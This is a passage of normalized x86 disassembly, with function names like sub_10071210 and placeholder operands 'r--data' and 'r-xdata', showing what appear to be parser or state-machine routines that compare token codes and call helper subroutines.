mov [ ebx + 0x20 ] eax
mov ecx [ r--data ]
mov [ ebx + 0x24 ] ecx
mov edx [ r--data ]
mov [ ebx + 0x28 ] edx
mov eax [ r--data ]
mov [ ebx + 0x2c ] eax
mov ecx [ r--data ]
mov [ ebx + 0x30 ] ecx
mov edx [ r--data ]
mov [ ebx + 0x34 ] edx
mov eax [ r--data ]
mov [ ebx + 0x38 ] eax
mov ecx [ r--data ]
mov [ ebx + 0x3c ] ecx
mov edx [ r--data ]
mov [ ebx + 0x40 ] edx
mov edx [ ebp - 0x4 ]
mov eax [ r--data ]
add edx 0x4c
push edx
mov [ ebx + 0x44 ] eax
mov ecx [ r--data ]
push ebx
push esi
mov [ ebx + 0x48 ] ecx
call sub_100049a0
mov eax esi
call sub_1006dc90
mov eax esi
call sub_1006dc90
push 0x1a
mov eax 0x20
mov ecx esi
call sub_1006e0e0
add esp 0x30
mov eax esi
call sub_1006dc90
mov eax esi
call sub_1006dc90
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov eax [ edx + ebx * 4 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
mov ecx [ eax + edi * 4 ]
cmp [ ecx + 0x20 ] 0x0
mov [ ebp + 0xc ] ecx
jne r-xdata
mov edx ebx
cmp [ edx + 0x28 ] 0x0
je r-xdata
push esi
call sub_1006e420
mov edi ebx
mov ebx esi
call sub_1006e0a0
push esi
call sub_1006d4e0
mov esi [ esi + 0xc ]
mov eax [ esi ]
add esp 0x8
cmp eax 0x8
je r-xdata
mov edx [ edi ]
mov [ edx + ebx * 4 ] 0x0
inc ebx
cmp ebx [ edi + 0x4 ]
jb r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
sub eax edx
push edi
push esi
mov ebx eax
call sub_1004b8a0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
push edx
push esi
call sub_1000ad70
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov [ edi + 0x4 ] ebx
push eax
inc ebx
push esi
mov [ edi + 0x8 ] ebx
call sub_100019c0
add esp 0x18
jmp r-xdata
call sub_1006ebe0
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax ecx
call sub_1006d940
add esp 0x4
test eax eax
jne r-xdata
pop edi
mov [ esi ] 0x10
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0xa
je r-xdata
cmp eax [ ebp - 0xc ]
je r-xdata
push 0x6d
mov eax 0x20
mov ecx esi
call sub_1006e0e0
mov edi [ ebp - 0x10 ]
xor ebx ebx
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ edi + 0x4 ] ebx
jbe r-xdata
dec edi
jns r-xdata
mov edi edx
call sub_1006e9c0
mov edi [ ebp + 0xc ]
cmp eax 0xc
je r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x4c
push ecx
push eax
push esi
call sub_100049a0
add esp 0xc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_1006dc90
cmp edi eax
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0xd
je r-xdata
cmp eax 0xe
je r-xdata
pop edi
mov [ esi ] 0xf
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
sub_10071210
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax [ edi ]
cmp eax 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0xc ]
add esi 0x48
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp eax 0x4
je r-xdata
mov edx [ edi + 0x18 ]
push esi
push edx
push eax
call sub_10016b30
add esp 0xc
cmp [ edi ] 0x5
jne r-xdata
mov edx [ edi + 0x10 ]
mov [ esi + 0xc ] edx
mov ecx [ edi + 0x4 ]
mov [ esi + 0x10 ] ecx
mov edx [ edi + 0x8 ]
mov [ esi + 0x14 ] edx
mov ecx [ edi + 0xc ]
mov [ esi + 0x18 ] ecx
mov esi [ ebp + 0x8 ]
cmp eax 0x7
jne r-xdata
mov eax [ edi + 0x18 ]
push eax
push r--data
call sub_1003bee0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov [ esi + 0x1c ] 0x2
mov eax esi
call sub_1006dc90
mov esi [ esi + 0xc ]
mov ecx [ esi + 0x4 ]
pop edi
mov [ esi ] ecx
mov eax 0x1
pop esi
pop ebp
retn
push esi
mov eax edi
call sub_1006d7e0
mov eax [ esi + 0xc ]
add esp 0x4
mov [ eax + 0x34 ] 0x1
sub_100712c0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0xc ]
mov [ ebp - 0x4 ] ecx
cmp esi 0x5
je r-xdata
mov edx [ ecx ]
mov eax 0x1
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x34 ] eax
mov ecx [ edi + 0xc ]
pop edi
pop esi
mov [ ecx ] 0x9
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x4
je r-xdata
test esi esi
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
mov eax ebx
call sub_1006d7e0
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_10059bc0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x1
jne r-xdata
mov eax [ ecx + 0xc ]
test eax eax
je r-xdata
push 0x96
push 0x66
push 0x68
push 0x67
push 0x64
push 0x65
push 0x63
push 0x1
mov eax ebx
call sub_1006d8a0
add esp 0x20
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
xor ecx ecx
cmp eax 0x60
sete cl
test ecx ecx
je r-xdata
mov esi ebx
mov ebx eax
mov eax edi
call sub_1006dd70
mov edx [ ecx + 0x8 ]
mov eax [ edx + eax * 4 - 0x4 ]
mov ecx 0x5f
cmp esi 0x1
jne r-xdata
mov esi edi
call sub_1006de30
mov eax [ edi + 0xc ]
push 0x96
push 0x66
push 0x68
mov [ eax ] 0xc
push 0x67
push 0x1
mov eax ebx
call sub_1006d8a0
add esp 0x14
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x61
sete cl
test ecx ecx
je r-xdata
mov esi edi
call sub_1006de30
mov ebx r--data
call sub_1006e3b0
mov edi [ ebp + 0xc ]
mov ebx esi
call sub_1006e0a0
mov eax [ ebx + 0xc ]
pop edi
pop esi
mov [ eax ] 0xa
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] ecx
sete al
test eax eax
je r-xdata
mov edi ebx
mov ebx esi
call sub_1006e0a0
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push 0x63
mov eax 0x8
mov ecx edi
call sub_1006e0e0
mov ecx [ ebp - 0x4 ]
add esp 0x4
pop edi
pop esi
mov [ ecx + 0x34 ] 0x1
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
cmp eax 0x62
sete dl
mov eax edx
test eax eax
je r-xdata
mov esi edi
call sub_1006de30
mov edi ebx
mov ebx esi
call sub_1006e0a0
mov ecx [ ebx + 0xc ]
pop edi
pop esi
mov [ ecx ] 0xb
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x0
push 0x61
push 0x62
push 0x60
push 0xa
push 0x0
mov eax ebx
call sub_1006d8a0
add esp 0x34
test eax eax
mov eax ebx
je r-xdata
xor eax eax
cmp [ ebx + 0x18 ] ecx
sete al
test eax eax
je r-xdata
push edi
mov eax ebx
call sub_1006d7e0
add esp 0x4
mov esi edi
call sub_1006ea40
test eax eax
je r-xdata
mov esi edi
call sub_1006de30
push 0x61
mov eax 0x8
mov ecx edi
call sub_1006e0e0
mov ecx [ edi + 0xc ]
add esp 0x4
mov eax 0x1
mov [ ecx + 0x34 ] eax
mov edx [ edi + 0xc ]
pop edi
pop esi
mov [ edx ] 0xb
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x7
push 0x6
push 0x1
call sub_1006d8a0
add esp 0x10
test eax eax
je r-xdata
push edi
call sub_1006d7e0
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_10059bc0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov esi edi
call sub_1006ea40
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_10059bc0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi + 0xc ]
pop edi
pop esi
mov [ edx + 0x34 ] 0x1
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x1
jne r-xdata
push ebx
push edi
call sub_1006fae0
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov eax ebx
call sub_1006d7e0
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x7
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x6d
sete al
test eax eax
je r-xdata
push edi
mov eax ebx
call sub_1006d7e0
mov esi [ ebp - 0x4 ]
push ebx
push edi
mov [ esi + 0x44 ] 0x1
call sub_1006fe10
add esp 0xc
pop edi
mov [ esi + 0x44 ] 0x0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
mov eax edi
call sub_1006d5e0
call sub_1006d940
add esp 0x4
jmp r-xdata
mov esi [ ebx ]
cmp esi 0x1
jne r-xdata
push r--data
lea ecx [ ebx + 0x1c ]
mov eax r--data
call sub_1006d430
add esp 0x4
test eax eax
je r-xdata
test eax eax
jne r-xdata
xor eax eax
cmp [ ebx + 0x18 ] 0x69
sete al
test eax eax
je r-xdata
push edi
mov eax ebx
call sub_1006d7e0
mov edi ebx
mov ebx [ ebp + 0x8 ]
add esp 0x4
call sub_1006e0a0
mov eax ebx
call sub_1006dc90
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov eax ebx
call sub_1006d7e0
mov ecx [ ebp - 0x4 ]
add esp 0x4
cmp [ ecx + 0x30 ] 0x0
je r-xdata
mov edi ebx
mov ebx [ ebp + 0x8 ]
call sub_1006e0a0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x30 ] eax
mov eax ebx
call sub_1006dc90
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_10059bc0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
sub_10071690
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push esi
cmp ecx 0x6
jne r-xdata
push edi
cmp ecx 0x5
je r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_1006d7e0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10059bc0
add esp 0xc
xor eax eax
pop esi
pop ebp
retn
mov edi eax
mov eax [ ebp + 0x8 ]
call sub_1006e240
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp ecx 0x4
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
mov esi [ ebx + 0xc ]
xor edi edi
cmp [ esi + 0x4c ] edi
jbe r-xdata
mov edi ebx
call sub_1006db30
mov edx [ esi + 0x4 ]
pop ebx
mov eax 0x1
pop edi
mov [ esi + 0x44 ] 0x0
mov [ esi + 0x34 ] eax
mov [ esi ] edx
pop esi
pop ebp
retn
mov edx [ esi + 0x48 ]
movsx eax [ edx + edi ]
push eax
call sub_100213ec
add esp 0x4
test eax eax
je r-xdata
push ebx
mov [ esi + 0x44 ] 0x1
call sub_1006e420
add esp 0x4
mov ecx [ esi + 0x48 ]
cmp [ edi + ecx ] 0xb
je r-xdata
inc edi
cmp edi [ esi + 0x4c ]
jb r-xdata
jmp r-xdata
sub_10071740
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov ebx [ ebp + 0xc ]
push edi
push 0x96
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x61
push 0x62
mov edi 0x60
push edi
mov esi 0x1
push esi
mov eax ebx
call sub_1006d8a0
add esp 0x2c
test eax eax
jne r-xdata
push 0x96
push 0x5f
push 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0x8 ]
push ecx
lea eax [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x10 ] eax
call sub_1006e640
add esp 0x18
test eax eax
jne r-xdata
push 0x96
push 0x5f
push edi
push eax
mov eax ebx
call sub_1006d8a0
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebx ] 0x2
jne r-xdata
push esi
mov eax ebx
call sub_1006d7e0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10059bc0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push eax
push 0x61
push 0x62
push 0xa
push eax
mov eax ebx
call sub_1006d8a0
add esp 0x30
test eax eax
je r-xdata
push esi
mov eax ebx
call sub_1006d7e0
mov ecx [ esi + 0xc ]
add esp 0x4
mov [ ecx + 0x34 ] 0x1
xor eax eax
cmp [ ebx + 0x18 ] edi
sete al
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push ebx
push edx
call sub_1006fe10
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
mov eax ebx
call sub_1006d7e0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10059bc0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ edx + ecx * 4 - 0x4 ]
mov edi 0x96
call sub_1006e9c0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0xc ]
mov edi 0x1
test ecx ecx
je r-xdata
push esi
mov eax ebx
call sub_1006d7e0
add esp 0x4
push 0x60
mov eax esi
call sub_1006d5e0
call sub_1006d940
add esp 0x4
test eax eax
jne r-xdata
cmp [ ecx + 0x1c ] 0x60
je r-xdata
xor edi edi
mov eax esi
call sub_1006dc90
push 0x60
mov eax esi
call sub_1006d5e0
call sub_1006d940
add esp 0x4
test eax eax
je r-xdata
mov eax esi
call sub_1006dc90
mov ebx esi
call sub_1006e530
mov eax [ esi + 0xc ]
mov [ eax ] 0x8
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100718f0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
mov edx [ edi ]
cmp edx 0x4
jne r-xdata
push esi
test edx edx
jne r-xdata
mov eax [ ebp + 0x8 ]
call sub_1006e240
mov eax 0x1
pop edi
pop ebp
retn
push ebx
cmp edx 0x3
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_1006d7e0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10059bc0
add esp 0xc
pop esi
xor eax eax
pop edi
pop ebp
retn
mov esi 0x1
cmp edx esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
cmp edx 0x2
jne r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
test eax eax
sete cl
test ecx ecx
je r-xdata
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi edi
mov ebx edx
call sub_1006dd70
pop ebx
pop esi
mov eax 0x1
pop edi
pop ebp
retn
mov esi edi
mov ebx edx
call sub_1006dd70
lea eax [ ebx + 0x1 ]
pop ebx
pop esi
pop edi
pop ebp
retn
mov ebx [ ebp + 0x8 ]
cmp edx 0x7
jne r-xdata
xor eax eax
cmp [ edi + 0x18 ] 0x62
sete al
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x62
sete cl
mov eax ecx
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edi
push edx
call sub_1006fe10
add esp 0x8
pop ebx
pop esi
pop edi
pop ebp
retn
mov eax ebx
call sub_1006d5e0
mov ecx [ ebx + 0x4 ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
mov eax ebx
call sub_1006d5e0
mov edx [ ebx + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_1006d7e0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10059bc0
add esp 0xc
pop ebx
pop esi
xor eax eax
pop edi
pop ebp
retn
mov ebx [ ebp + 0x8 ]
call sub_1006e0a0
mov eax ebx
call sub_1006dc90
mov edx [ ebx + 0xc ]
pop ebx
mov [ edx + 0x38 ] esi
mov eax esi
pop esi
pop edi
pop ebp
retn
mov eax ebx
call sub_1006dc90
mov edx [ ebx + 0xc ]
mov [ edx ] 0x8
cmp [ edi ] 0x2
jne r-xdata
push ebx
mov eax edi
call sub_1006d7e0
add esp 0x4
pop ebx
pop esi
xor eax eax
pop edi
pop ebp
retn
pop ebx
mov eax esi
pop esi
pop edi
pop ebp
retn
mov eax [ ebx + 0xc ]
mov [ eax + 0x34 ] esi
xor eax eax
cmp [ edi + 0x18 ] 0x61
sete al
test eax eax
jne r-xdata
sub_10071a60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ edi ]
mov esi 0x1
cmp ebx esi
jne r-xdata
push 0x96
push 0x68
push 0x67
push esi
mov eax edi
call sub_1006d8a0
add esp 0x10
test eax eax
mov eax edi
je r-xdata
xor eax eax
cmp [ edi + 0x18 ] 0x66
sete al
test eax eax
je r-xdata
push 0x96
push 0x64
push 0x65
push 0x63
push 0x0
call sub_1006d8a0
add esp 0x14
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
call sub_1006d7e0
push ebx
call sub_10018b60
push 0x66
call sub_1006de80
mov edi eax
or [ edi + 0xc ] 0x9
push 0x0
mov ecx ebx
call sub_1006dff0
add esp 0x10
push edi
push 0x66
call sub_10045960
add esp 0x4
push eax
push r--data
call sub_1003bee0
mov edx [ ebx + 0xc ]
add esp 0xc
mov [ edx + 0x34 ] esi
mov eax [ ebx + 0xc ]
pop edi
pop esi
mov [ eax ] 0xd
xor eax eax
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push ebx
call sub_10018b60
push 0x0
push ebx
call sub_1006df30
push 0x0
mov ecx ebx
mov edi eax
call sub_1006dff0
mov eax [ edi + 0x1c ]
add esp 0x10
push edi
push eax
call sub_10045960
add esp 0x4
push eax
push r--data
call sub_1003bee0
mov ecx [ ebx + 0xc ]
add esp 0xc
pop edi
mov eax esi
pop esi
mov [ ecx ] 0xd
pop ebx
pop ebp
retn
push 0x96
push 0x64
push 0x65
push 0x63
push 0x61
push 0x62
push 0x60
push esi
mov eax edi
call sub_1006d8a0
add esp 0x20
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov eax [ edi + 0x18 ]
push ebx
call sub_1006e940
add esp 0x4
push ebx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
push ebx
mov eax 0x63
call sub_1006e940
add esp 0x4
test eax eax
jne r-xdata
cmp ebx 0x2
jne r-xdata
mov eax edi
call sub_1006d7e0
mov ecx [ ebx + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push ebx
call sub_10059bc0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
call sub_10018b60
add esp 0x4
mov eax ebx
call sub_1006dc90
mov eax [ ebx + 0xc ]
pop edi
mov [ eax ] 0x8
mov eax esi
pop esi
pop ebx
pop ebp
retn
push ebx
call sub_10018b60
add esp 0x4
mov eax ebx
call sub_1006dc90
mov eax [ ebx + 0xc ]
mov [ eax ] 0x8
mov ecx [ ebx + 0xc ]
pop edi
mov [ ecx + 0x34 ] esi
mov eax esi
pop esi
pop ebx
pop ebp
retn
push ebx
mov eax 0x64
call sub_1006e940
add esp 0x4
test eax eax
jne r-xdata
push 0x96
push 0x68
push 0x67
push 0x0
push 0x61
push 0x66
push 0x62
push 0x60
push 0xa
push 0x0
mov eax edi
call sub_1006d8a0
add esp 0x28
test eax eax
je r-xdata
cmp [ edi + 0x18 ] 0x5f
sete al
test eax eax
jne r-xdata
push ebx
mov eax 0x65
call sub_1006e940
add esp 0x4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push edi
push eax
call sub_100712c0
add esp 0x8
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_1006d7e0
mov ecx [ esi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push esi
call sub_10059bc0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
push ebx
sub_10071ca0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x96
push 0x67
push 0x68
mov ebx 0x1
push ebx
mov eax edi
call sub_1006d8a0
add esp 0x10
test eax eax
je r-xdata
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x61
push 0x60
push ebx
mov eax edi
call sub_1006d8a0
add esp 0x20
test eax eax
jne r-xdata
mov esi [ ebp + 0x8 ]
call sub_1006dde0
push 0x0
push esi
call sub_1006df30
push 0x0
mov ecx esi
mov edi eax
call sub_1006dff0
mov eax [ edi + 0x1c ]
add esp 0xc
push edi
push eax
call sub_10045960
add esp 0x4
push eax
push r--data
call sub_1003bee0
mov ecx [ esi + 0xc ]
add esp 0xc
mov ebx r--data
mov edi esi
mov [ ecx ] 0xe
call sub_1006e3b0
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x64
push 0x65
push 0x63
push 0x0
mov eax edi
call sub_1006d8a0
add esp 0x14
test eax eax
je r-xdata
push 0x96
push 0x64
push 0x65
push 0x63
push 0x5f
push 0x66
push eax
mov eax edi
call sub_1006d8a0
add esp 0x1c
test eax eax
jne r-xdata
mov esi 0x66
mov esi [ edi + 0x18 ]
jmp r-xdata
push 0x96
push 0x68
push 0x67
push eax
push 0x61
push 0x62
push 0x60
push 0xa
push eax
mov eax edi
call sub_1006d8a0
add esp 0x24
test eax eax
je r-xdata
mov esi ebx
call sub_1006dde0
mov eax ebx
call sub_1006dc90
mov edx [ ebx + 0xc ]
mov [ edx ] 0xc
cmp [ edi ] 0x2
jne r-xdata
push esi
call sub_10045960
push eax
push r--data
call sub_1003bee0
mov eax [ ebx + 0xc ]
xor esi esi
add esp 0xc
cmp [ eax + 0xc ] esi
jbe r-xdata
push 0x96
push 0x5f
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
push ebx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x10 ] edx
call sub_1006e640
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ecx
call sub_100712c0
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_1006d7e0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10059bc0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0xc ]
mov [ eax + 0x34 ] 0x1
xor eax eax
cmp [ edi + 0x18 ] 0x66
sete al
test eax eax
jne r-xdata
push ebx
mov eax edi
call sub_1006d7e0
mov eax [ ebx + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push ebx
call sub_10059bc0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax + 0x8 ]
mov eax [ ecx + esi * 4 ]
mov edx [ eax + 0x1c ]
push edx
call sub_10045960
push eax
push r--data
call sub_1003bee0
mov eax [ ebx + 0xc ]
inc esi
add esp 0xc
cmp esi [ eax + 0xc ]
jb r-xdata
sub_10071ec0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x96
push 0x68
push 0x67
push 0x0
mov eax edi
call sub_1006d8a0
add esp 0x10
mov ebx 0x1
push 0x96
test eax eax
je r-xdata
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x61
push 0x62
push 0x60
push ebx
mov eax edi
call sub_1006d8a0
add esp 0x2c
test eax eax
je r-xdata
mov esi [ edi + 0x18 ]
push 0x5f
push 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp + 0x8 ]
push ecx
lea eax [ ebp - 0x4 ]
push ebx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x10 ] eax
call sub_1006e640
add esp 0x18
test eax eax
jne r-xdata
push 0x96
push 0x0
push 0x61
push 0x62
push 0x60
push 0xa
push 0x0
mov eax edi
call sub_1006d8a0
add esp 0x1c
test eax eax
mov eax edi
je r-xdata
push r--data
call sub_1003bee0
mov esi [ ebp + 0x8 ]
push 0x96
push 0x5f
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] 0x68
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
call sub_1006e640
add esp 0x1c
test eax eax
jne r-xdata
push edi
mov eax esi
mov ecx ebx
call sub_1006eab0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
mov eax edi
call sub_1006d7e0
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push 0x0
call sub_1006d8a0
add esp 0x1c
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_1006d7e0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10059bc0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0xc ]
mov [ edx + 0x34 ] ebx
call sub_1006eb60
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x5f
push eax
push eax
lea edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] 0x67
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
call sub_1006e640
add esp 0x18
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edi
push edx
call sub_1006fe10
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ edi + 0x18 ]
push esi
call sub_1006e940
add esp 0x4
test eax eax
jne r-xdata
push r--data
call sub_1003bee0
push esi
mov eax edi
call sub_1006d7e0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_10059bc0
add esp 0x10
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0xc ]
mov [ ecx + 0x34 ] ebx
call sub_1006eb60
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax edi
call sub_1006d7e0
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_10059bc0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
sub_100720d0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ esi ]
cmp edi 0x6
jne r-xdata
cmp edi 0x5
je r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006d7e0
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_10059bc0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edi esi
call sub_1006e240
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp edi 0x4
je r-xdata
test edi edi
jne r-xdata
push ebx
cmp edi 0x3
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006d7e0
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
